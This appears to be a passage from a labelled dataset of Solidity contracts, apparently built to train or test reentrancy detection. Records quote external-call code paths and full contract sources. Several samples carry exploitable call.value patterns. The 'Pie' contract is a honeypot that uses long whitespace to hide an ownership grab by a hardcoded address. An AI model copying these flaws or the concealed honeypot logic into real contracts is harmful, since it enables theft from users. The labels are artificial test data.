0; j < dispute.votes[i].length; ++j) { vote = dispute.votes[i][j]; if (vote.ruling == winningChoice) { juror = jurors[vote.account]; juror.balance += toRedistribute; TokenShift(vote.account, _disputeID, int(toRedistribute)); } } } } for (j = 0; j < dispute.votes[i].length; ++j) { vote = dispute.votes[i][j]; juror = jurors[vote.account]; juror.atStake -= amountShift; } } dispute.state = DisputeState.Executable; } function multipleShotTokenRepartition(uint _disputeID, uint _maxIterations) public onlyDuring(Period.Execution) { Dispute storage dispute = disputes[_disputeID]; require(dispute.state <= DisputeState.Resolving); require(dispute.session+dispute.appeals <= session); dispute.state = DisputeState.Resolving; uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice; uint amountShift = getStakePerDraw(); uint currentIterations = 0; for (uint i = dispute.currentAppealToRepartition; i <= dispute.appeals; ++i) { if (dispute.appealsRepartitioned.length < i+1) { dispute.appealsRepartitioned.length++; } if (winningChoice==0 && (dispute.voteCounter[dispute.appeals].voteCount[0] != dispute.voteCounter[dispute.appeals].winningCount)) { dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake; } if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Incoherent) { for (uint j = dispute.appealsRepartitioned[i].currentIncoherentVote; j < dispute.votes[i].length; ++j) { if (currentIterations >= _maxIterations) { return; } Vote storage vote = dispute.votes[i][j]; if (vote.ruling != winningChoice) { Juror storage juror = jurors[vote.account]; uint penalty = amountShift<juror.balance ? amountShift : juror.balance; juror.balance -= penalty; TokenShift(vote.account, _disputeID, int(-penalty)); dispute.appealsRepartitioned[i].totalToRedistribute += penalty; } else { ++dispute.appealsRepartitioned[i].nbCoherent; } ++dispute.appealsRepartitioned[i].currentIncoherentVote; ++currentIterations; } dispute.appealsRepartitioned[i].stage = RepartitionStage.Coherent; } if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Coherent) { if (dispute.appealsRepartitioned[i].nbCoherent == 0) { jurors[governor].balance += dispute.appealsRepartitioned[i].totalToRedistribute; TokenShift(governor, _disputeID, int(dispute.appealsRepartitioned[i].totalToRedistribute)); dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake; } else { uint toRedistribute = dispute.appealsRepartitioned[i].totalToRedistribute / dispute.appealsRepartitioned[i].nbCoherent; for (j = dispute.appealsRepartitioned[i].currentCoherentVote; j < dispute.votes[i].length; ++j) { if (currentIterations >= _maxIterations) { return; } vote = dispute.votes[i][j]; if (vote.ruling == winningChoice) { juror = jurors[vote.account]; juror.balance += toRedistribute; TokenShift(vote.account, _disputeID, int(toRedistribute)); } ++currentIterations; ++dispute.appealsRepartitioned[i].currentCoherentVote; } dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake; } } if (dispute.appealsRepartitioned[i].stage == RepartitionStage.AtStake) { for (j = dispute.appealsRepartitioned[i].currentAtStakeVote; j < dispute.votes[i].length; ++j) { if (currentIterations >= _maxIterations) { return; } vote = dispute.votes[i][j]; juror = jurors[vote.account]; juror.atStake -= amountShift; ++currentIterations; ++dispute.appealsRepartitioned[i].currentAtStakeVote; } dispute.appealsRepartitioned[i].stage = RepartitionStage.Complete; } if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Complete) { ++dispute.currentAppealToRepartition; } } dispute.state = DisputeState.Executable; } function amountJurors(uint _disputeID) public view returns (uint nbJurors) { Dispute storage dispute = disputes[_disputeID]; return (dispute.initialNumberJurors + 1) * 2**dispute.appeals - 1; } function validDraws(address _jurorAddress, uint _disputeID, uint[] _draws) public view returns (bool valid) { uint draw = 0; Juror storage juror = jurors[_jurorAddress]; Dispute storage dispute = disputes[_disputeID]; uint nbJurors = amountJurors(_disputeID); if (juror.lastSession != session) return false; if (dispute.session+dispute.appeals != session) return false; if (period <= Period.Draw) return false; for (uint i = 0; i < _draws.length; ++i) { if (_draws[i] <= draw) return false; draw = _draws[i]; if (draw > nbJurors) return false; uint position = uint(keccak256(randomNumber, _disputeID, draw)) % segmentSize; require(position >= juror.segmentStart); require(position < juror.segmentEnd); } return true; } function createDispute(uint _choices, bytes _extraData) public payable returns (uint disputeID) { uint16 nbJurors = extraDataToNbJurors(_extraData); require(msg.value >= arbitrationCost(_extraData)); disputeID = disputes.length++; Dispute storage dispute = disputes[disputeID]; dispute.arbitrated = Arbitrable(msg.sender); if (period < Period.Draw) dispute.session = session; else dispute.session = session+1; dispute.choices = _choices; dispute.initialNumberJurors = nbJurors; dispute.arbitrationFeePerJuror = arbitrationFeePerJuror; dispute.votes.length++; dispute.voteCounter.length++; DisputeCreation(disputeID, Arbitrable(msg.sender)); return disputeID; } function appeal(uint _disputeID, bytes _extraData) public payable onlyDuring(Period.Appeal) { super.appeal(_disputeID,_extraData); Dispute storage dispute = disputes[_disputeID]; require(msg.value >= appealCost(_disputeID, _extraData)); require(dispute.session+dispute.appeals == session); require(dispute.arbitrated == msg.sender); dispute.appeals++; dispute.votes.length++; dispute.voteCounter.length++; } function executeRuling(uint disputeID) public { Dispute storage dispute = disputes[disputeID]; require(dispute.state == DisputeState.Executable); dispute.state = DisputeState.Executed; dispute.arbitrated.rule(disputeID, dispute.voteCounter[dispute.appeals].winningChoice); } function arbitrationCost(bytes _extraData) public view returns (uint fee) { return extraDataToNbJurors(_extraData) * arbitrationFeePerJuror; } function appealCost(uint _disputeID, bytes _extraData) public view returns (uint fee) { Dispute storage dispute = disputes[_disputeID]; if(dispute.appeals >= maxAppeals) return NON_PAYABLE_AMOUNT; return (2*amountJurors(_disputeID) + 1) * dispute.arbitrationFeePerJuror; } function extraDataToNbJurors(bytes _extraData) internal view returns (uint16 nbJurors) { if (_extraData.length < 2) return defaultNumberJuror; else return (uint16(_extraData[0]) << 8) + uint16(_extraData[1]); } function getStakePerDraw() public view returns (uint minActivatedTokenInAlpha) { return (alpha * minActivatedToken) / ALPHA_DIVISOR; } function getVoteAccount(uint _disputeID, uint _appeals, uint _voteID) public view returns (address account) { return disputes[_disputeID].votes[_appeals][_voteID].account; } function getVoteRuling(uint _disputeID, uint _appeals, uint _voteID) public view returns (uint ruling) { return disputes[_disputeID].votes[_appeals][_voteID].ruling; } function getWinningChoice(uint _disputeID, uint _appeals) public view returns (uint winningChoice) { return disputes[_disputeID].voteCounter[_appeals].winningChoice; } function getWinningCount(uint _disputeID, uint _appeals) public view returns (uint winningCount) { return disputes[_disputeID].voteCounter[_appeals].winningCount; } function getVoteCount(uint _disputeID, uint _appeals, uint _choice) public view returns (uint voteCount) { return disputes[_disputeID].voteCounter[_appeals].voteCount[_choice]; } function getLastSessionVote(uint _disputeID, address _juror) public view returns (uint lastSessionVote) { return disputes[_disputeID].lastSessionVote[_juror]; } function isDrawn(uint _disputeID, address _juror, uint _draw) public view returns (bool drawn) { Dispute storage dispute = disputes[_disputeID]; Juror storage juror = jurors[_juror]; if (juror.lastSession != session || (dispute.session+dispute.appeals != session) || period<=Period.Draw || _draw>amountJurors(_disputeID) || _draw==0 || segmentSize==0 ) { return false; } else { uint position = uint(keccak256(randomNumber,_disputeID,_draw)) % segmentSize; return (position >= juror.segmentStart) && (position < juror.segmentEnd); } } function currentRuling(uint _disputeID) public view returns (uint ruling) { Dispute storage dispute = disputes[_disputeID]; return dispute.voteCounter[dispute.appeals].winningChoice; } function disputeStatus(uint _disputeID) public view returns (DisputeStatus status) { Dispute storage dispute = disputes[_disputeID]; if (dispute.session+dispute.appeals < session) return DisputeStatus.Solved; else if(dispute.session+dispute.appeals == session) { if (dispute.state == DisputeState.Open) { if (period < Period.Appeal) return DisputeStatus.Waiting; else if (period == Period.Appeal) return DisputeStatus.Appealable; else return DisputeStatus.Solved; } else return DisputeStatus.Solved; } else return DisputeStatus.Waiting; } function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor { _target.call.value(_value)(_data); } function setRng(RNG _rng) public onlyGovernor { rng = _rng; } function setArbitrationFeePerJuror(uint _arbitrationFeePerJuror) public onlyGovernor { arbitrationFeePerJuror = _arbitrationFeePerJuror; } function setDefaultNumberJuror(uint16 _defaultNumberJuror) public onlyGovernor { defaultNumberJuror = _defaultNumberJuror; } function setMinActivatedToken(uint _minActivatedToken) public onlyGovernor { minActivatedToken = _minActivatedToken; } function setTimePerPeriod(uint[5] _timePerPeriod) public onlyGovernor { timePerPeriod = _timePerPeriod; } function setAlpha(uint _alpha) public onlyGovernor { alpha = _alpha; } function setMaxAppeals(uint _maxAppeals) public onlyGovernor { maxAppeals = _maxAppeals; } function setGovernor(address _governor) public onlyGovernor { governor = _governor; } } "}
{"sol name": "33851.sol", "label": 0, "first path": "function donate( bytes32 hash) payable { print(hash); if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw; uint256 tokens = (msg.value * price()); balances[msg.sender] = (balances[msg.sender] + tokens); totalSupply = (totalSupply + tokens); saleEtherRaised = (saleEtherRaised + msg.value); if (!founder.call.value(msg.value)()) throw; Donate(msg.value, tokens); ", "second path": "function donate( bytes32 hash) payable { print(hash); if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw; uint256 tokens = (msg.value * price()); balances[msg.sender] = (balances[msg.sender] + tokens); totalSupply = (totalSupply + tokens); saleEtherRaised = (saleEtherRaised + msg.value); if (!founder.call.value(msg.value)()) throw; Donate(msg.value, tokens); ", "third path": "function donate( bytes32 hash) payable { print(hash); if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw; uint256 tokens = (msg.value * price()); balances[msg.sender] = (balances[msg.sender] + tokens); totalSupply = (totalSupply + tokens); saleEtherRaised = (saleEtherRaised + msg.value); if (!founder.call.value(msg.value)()) throw; Donate(msg.value, tokens); ", "long path": "pragma solidity ^0.4.11; contract MoacToken  { function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping(address => uint256) balances; mapping(address => uint256) redeem; mapping (address => mapping (address => uint256)) allowed; uint256 public totalSupply; string public name = \"MoacToken Token\"; string public symbol = \"MOAC\"; uint public decimals = 18; uint public startBlock; uint public endBlock; address public founder = 0x0; address public owner = 0x0; address public signer = 0x0; uint256 public levelOneTokenNum = 30000000 * 10**18; uint256 public levelTwoTokenNum = 50000000 * 10**18; uint256 public levelThreeTokenNum = 75000000 * 10**18; uint256 public levelFourTokenNum = 100000000 * 10**18; uint256 public etherCap = 1000000 * 10**18; uint public transferLockup = 370285; uint public founderLockup = 86400; uint256 public founderAllocation = 100 * 10**16; bool public founderAllocated = false; uint256 public saleTokenSupply = 0; uint256 public saleEtherRaised = 0; bool public halted = false; event Donate(uint256 eth, uint256 fbt); event AllocateFounderTokens(address indexed sender); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); event print(bytes32 msg); function MoacToken(address founderInput, address signerInput, uint startBlockInput, uint endBlockInput) { founder = founderInput; signer = signerInput; startBlock = startBlockInput; endBlock = endBlockInput; owner = msg.sender; } function price() constant returns(uint256) { if (totalSupply<levelOneTokenNum) return 1600; if (totalSupply>=levelOneTokenNum && totalSupply < levelTwoTokenNum) return 1000; if (totalSupply>=levelTwoTokenNum && totalSupply < levelThreeTokenNum) return 800; if (totalSupply>=levelThreeTokenNum && totalSupply < levelFourTokenNum) return 730; if (totalSupply>=levelFourTokenNum) return 680; return 1600; } function testPrice(uint256 currentSupply) constant returns(uint256) { if (currentSupply<levelOneTokenNum) return 1600; if (currentSupply>=levelOneTokenNum && currentSupply < levelTwoTokenNum) return 1000; if (currentSupply>=levelTwoTokenNum && currentSupply < levelThreeTokenNum) return 800; if (currentSupply>=levelThreeTokenNum && currentSupply < levelFourTokenNum) return 730; if (currentSupply>=levelFourTokenNum) return 680; return 1600; } function donate( bytes32 hash) payable { print(hash); if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw; uint256 tokens = (msg.value * price()); balances[msg.sender] = (balances[msg.sender] + tokens); totalSupply = (totalSupply + tokens); saleEtherRaised = (saleEtherRaised + msg.value); if (!founder.call.value(msg.value)()) throw; Donate(msg.value, tokens); } function allocateFounderTokens() { if (msg.sender!=founder) throw; if (block.number <= endBlock + founderLockup) throw; if (founderAllocated) throw; balances[founder] = (balances[founder] + saleTokenSupply * founderAllocation / (1 ether)); totalSupply = (totalSupply + saleTokenSupply * founderAllocation / (1 ether)); founderAllocated = true; AllocateFounderTokens(msg.sender); } function offlineDonate(uint256 offlineTokenNum, uint256 offlineEther) { if (msg.sender!=signer) throw; if (block.number >= endBlock) throw; if( (totalSupply +offlineTokenNum) > totalSupply && (saleEtherRaised + offlineEther)>saleEtherRaised){ totalSupply = (totalSupply + offlineTokenNum); balances[founder] = (balances[founder] + offlineTokenNum ); saleEtherRaised = (saleEtherRaised + offlineEther); } } function offlineAdjust(uint256 offlineTokenNum, uint256 offlineEther) { if (msg.sender!=founder) throw; if (block.number >= endBlock) throw; if( (totalSupply - offlineTokenNum) > 0 && (saleEtherRaised - offlineEther) > 0 && (balances[founder] - offlineTokenNum)>0){ totalSupply = (totalSupply - offlineTokenNum); balances[founder] = (balances[founder] - offlineTokenNum ); saleEtherRaised = (saleEtherRaised - offlineEther); } } function redeemBalanceOf(address _owner) constant returns (uint256 balance) { return redeem[_owner]; } function redeemToken(uint256 tokenNum) { if (block.number <= (endBlock + transferLockup) && msg.sender!=founder) throw; if( balances[msg.sender] < tokenNum ) throw; balances[msg.sender] = (balances[msg.sender] - tokenNum ); redeem[msg.sender] += tokenNum; } function redeemRestore(address _to, uint256 tokenNum){ if( msg.sender != founder) throw; if( redeem[_to] < tokenNum ) throw; redeem[_to] -= tokenNum; balances[_to] += tokenNum; } function halt() { if (msg.sender!=founder) throw; halted = true; } function unhalt() { if (msg.sender!=founder) throw; halted = false; } function kill() { if (msg.sender == owner) suicide(owner); } function changeFounder(address newFounder) { if (msg.sender!=founder) throw; founder = newFounder; } function transfer(address _to, uint256 _value) returns (bool success) { if (block.number <= (endBlock + transferLockup) && msg.sender!=founder) throw; if (balances[msg.sender] >= _value && (balances[_to] + _value) > balances[_to]) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (block.number <= (endBlock + transferLockup) && msg.sender!=founder) throw; if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && (balances[_to] + _value) > balances[_to]) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function() { throw; } } "}
{"sol name": "36732.sol", "label": 0, "first path": "function claim_bounty(){ if (this.balance < eth_minimum) return; if (bought_tokens) return; if (now < earliest_buy_time) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; uint256 claimed_bounty = buy_bounty; buy_bounty = 0; contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty); require(sale.call.value(contract_eth_value)()); msg.sender.transfer(claimed_bounty); ", "second path": "function claim_bounty(){ if (this.balance < eth_minimum) return; if (bought_tokens) return; if (now < earliest_buy_time) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; uint256 claimed_bounty = buy_bounty; buy_bounty = 0; contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty); require(sale.call.value(contract_eth_value)()); msg.sender.transfer(claimed_bounty); ", "third path": "function claim_bounty(){ if (this.balance < eth_minimum) return; if (bought_tokens) return; if (now < earliest_buy_time) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; uint256 claimed_bounty = buy_bounty; buy_bounty = 0; contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty); require(sale.call.value(contract_eth_value)()); msg.sender.transfer(claimed_bounty); ", "long path": "pragma solidity ^0.4.16; contract ERC20 { function transfer(address _to, uint256 _value) returns (bool success); function balanceOf(address _owner) constant returns (uint256 balance); } contract EnjinBuyer { uint256 public eth_minimum = 3270 ether; mapping (address => uint256) public balances; uint256 public buy_bounty; uint256 public withdraw_bounty; bool public bought_tokens; uint256 public contract_eth_value; bool public kill_switch; bytes32 password_hash = 0x48e4977ec30c7c773515e0fbbfdce3febcd33d11a34651c956d4502def3eac09; uint256 public earliest_buy_time = 1504188000; uint256 public eth_cap = 5000 ether; address public developer = 0xA4f8506E30991434204BC43975079aD93C8C5651; address public sale; ERC20 public token; function set_sale_address(address _sale) { require(msg.sender == developer); require(sale == 0x0); sale = _sale; } function activate_kill_switch(string password) { require(msg.sender == developer || sha3(password) == password_hash); uint256 claimed_bounty = buy_bounty; buy_bounty = 0; kill_switch = true; msg.sender.transfer(claimed_bounty); } function withdraw(address user, address _token){ require(msg.sender == user); require(bought_tokens || now > earliest_buy_time + 1 hours); if (balances[user] == 0) return; if (!bought_tokens) { uint256 eth_to_withdraw = balances[user]; balances[user] = 0; user.transfer(eth_to_withdraw); } else { token = ERC20(_token); uint256 contract_token_balance = token.balanceOf(address(this)); require(contract_token_balance != 0); uint256 tokens_to_withdraw = (balances[user] * contract_token_balance) / contract_eth_value; contract_eth_value -= balances[user]; balances[user] = 0; require(token.transfer(user, tokens_to_withdraw)); } uint256 claimed_bounty = withdraw_bounty / 100; withdraw_bounty -= claimed_bounty; msg.sender.transfer(claimed_bounty); } function add_to_buy_bounty() payable { require(msg.sender == developer); buy_bounty += msg.value; } function add_to_withdraw_bounty() payable { require(msg.sender == developer); withdraw_bounty += msg.value; } function claim_bounty(){ if (this.balance < eth_minimum) return; if (bought_tokens) return; if (now < earliest_buy_time) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; uint256 claimed_bounty = buy_bounty; buy_bounty = 0; contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty); require(sale.call.value(contract_eth_value)()); msg.sender.transfer(claimed_bounty); } function () payable { require(!kill_switch); require(!bought_tokens); require(this.balance < eth_cap); balances[msg.sender] += msg.value; } } "}
{"sol name": "27159.sol", "label": 1, "first path": "function transfer(address to, uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); return true; function transfer(address to, uint256 value) public  { bytes memory empty; _transfer(msg.sender, to, value, empty); function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); _transfer( msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; ", "second path": "function transfer(address to, uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); return true; function transfer(address to, uint256 value) public  { bytes memory empty; _transfer(msg.sender, to, value, empty); function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); _transfer( msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; ", "third path": "function transfer(address to, uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); return true; function transfer(address to, uint256 value) public  { bytes memory empty; _transfer(msg.sender, to, value, empty); function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); _transfer( msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; ", "long path": "pragma solidity ^0.4.19; interface tokenRecipient { function receiveApproval( address from, uint256 value, bytes data ) public; } interface ContractReceiver { function tokenFallback( address from, uint value, bytes data ) public; } contract ERC223Token { string  public name; string  public symbol; uint8   public decimals; uint256 public totalSupply; mapping( address => uint256 ) balances_; mapping( address => mapping(address => uint256) ) allowances_; event Approval( address indexed owner, address indexed spender, uint value ); event Transfer( address indexed from, address indexed to, uint256 value ); event Burn( address indexed from, uint256 value ); function ERC223Token( uint256 initialSupply, string tokenName, uint8 decimalUnits,   string tokenSymbol ) public  { totalSupply = initialSupply * 10 ** uint256(decimalUnits); balances_[msg.sender] = totalSupply; name = tokenName; decimals = decimalUnits; symbol = tokenSymbol; } function() public payable { revert(); } function balanceOf( address owner ) public constant returns (uint) { return balances_[owner]; } function approve( address spender, uint256 value ) public  returns (bool success)  { allowances_[msg.sender][spender] = value; Approval( msg.sender, spender, value ); return true; } function allowance( address owner, address spender ) public constant  returns (uint256 remaining)  { return allowances_[owner][spender]; } function transfer(address to, uint256 value) public  { bytes memory empty; _transfer(msg.sender, to, value, empty); } function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; } function approveAndCall( address spender,  uint256 value,   bytes context ) public returns (bool success) { if ( approve(spender, value) )    { tokenRecipient recip = tokenRecipient( spender ); recip.receiveApproval( msg.sender, value, context ); return true; } return false; } function burn( uint256 value ) public  returns (bool success)  { require( balances_[msg.sender] >= value ); balances_[msg.sender] -= value; totalSupply -= value; Burn( msg.sender, value ); return true; } function burnFrom( address from, uint256 value ) public  returns (bool success)  { require( balances_[from] >= value ); require( value <= allowances_[from][msg.sender] ); balances_[from] -= value; allowances_[from][msg.sender] -= value; totalSupply -= value; Burn( from, value ); return true; } function transfer(address to, uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); } return true; } function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); } _transfer( msg.sender, to, value, data ); return true; } function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; } function isContract( address _addr ) private constant returns (bool) { uint length; assembly { length := extcodesize(_addr) } return (length > 0); } function _transfer( address from,  address to, uint value,  bytes data ) internal  { require( to != 0x0 ); require( balances_[from] >= value ); require( balances_[to] + value > balances_[to] ); balances_[from] -= value; balances_[to] += value; bytes memory empty; empty = data; Transfer( from, to, value ); } } "}
{"sol name": "27398.sol", "label": 0, "first path": "function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); ", "second path": "function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); ", "third path": "function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); ", "long path": "pragma solidity ^0.4.19; contract Pie { address public Owner = msg.sender; function() public payable { } function Get() public payable { if(msg.value>1 ether) {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw()  payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } } "}
{"sol name": "15458.sol", "label": 1, "first path": "function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) { _transfer( msg.sender, to, value, data ); require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data)); return true; function transfer(address to, uint256 value) public  returns (bool success)  { bytes memory empty; _transfer(msg.sender, to, value, empty); return true; function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer(from, to, value, empty); return true; function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); _transfer( msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); if (isContract(rx)) { rx.tokenFallback( msg.sender, value, data ); return true; return false; ", "second path": "function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) { _transfer( msg.sender, to, value, data ); require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data)); return true; function transfer(address to, uint256 value) public  returns (bool success)  { bytes memory empty; _transfer(msg.sender, to, value, empty); return true; function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer(from, to, value, empty); return true; function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); _transfer( msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); if (isContract(rx)) { rx.tokenFallback( msg.sender, value, data ); return true; return false; ", "third path": "function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) { _transfer( msg.sender, to, value, data ); require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data)); return true; function transfer(address to, uint256 value) public  returns (bool success)  { bytes memory empty; _transfer(msg.sender, to, value, empty); return true; function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer(from, to, value, empty); return true; function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); _transfer( msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); if (isContract(rx)) { rx.tokenFallback( msg.sender, value, data ); return true; return false; ", "long path": "pragma solidity ^0.4.20; interface tokenRecipient { function receiveApproval( address from, uint256 value, bytes data ) external; } interface ContractReceiver { function tokenFallback( address from, uint value, bytes data ) external; } contract owned { address public owner; function owned() public { owner = msg.sender; } function changeOwner( address _miner ) public onlyOwner { owner = _miner; } modifier onlyOwner { require (msg.sender == owner); _; } } contract MineableToken is owned { string  public name; string  public symbol; uint8   public decimals; uint256 public totalSupply; uint256 public supplyCap; mapping( address => uint256 ) balances_; mapping( address => mapping(address => uint256) ) allowances_; event Approval( address indexed owner, address indexed spender, uint value ); event Transfer(address indexed from, address indexed to, uint256 value); event Burn( address indexed from, uint256 value ); function MineableToken() public { decimals = uint8(18); supplyCap = 4 * 1e9 * 10**uint256(decimals); name = \"Jbox\"; symbol = \"JBX\"; } function mine( uint256 qty ) public onlyOwner { require((totalSupply + qty) > totalSupply && (totalSupply + qty) <= supplyCap); totalSupply += qty; balances_[owner] += qty; Transfer( address(0), owner, qty ); } function cap() public constant returns(uint256) { return supplyCap; } function balanceOf( address owner ) public constant returns (uint) { return balances_[owner]; } function approve( address spender, uint256 value ) public returns (bool success) { allowances_[msg.sender][spender] = value; Approval( msg.sender, spender, value ); return true; } function safeApprove( address _spender, uint256 _currentValue, uint256 _value ) public returns (bool success) { if (allowances_[msg.sender][_spender] == _currentValue) return approve(_spender, _value); return false; } function allowance( address owner, address spender ) public constant returns (uint256 remaining) { return allowances_[owner][spender]; } function transfer(address to, uint256 value) public  returns (bool success)  { bytes memory empty; _transfer(msg.sender, to, value, empty); return true; } function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer(from, to, value, empty); return true; } function approveAndCall( address spender,uint256 value, bytes context ) public returns (bool success) { if ( approve(spender, value) ) { tokenRecipient recip = tokenRecipient( spender ); if (isContract(recip)) recip.receiveApproval( msg.sender, value, context ); return true; } return false; } function burn( uint256 value ) public returns (bool success) { require( balances_[msg.sender] >= value ); balances_[msg.sender] -= value; totalSupply -= value; Burn( msg.sender, value ); return true; } function burnFrom( address from, uint256 value ) public returns (bool success) { require( balances_[from] 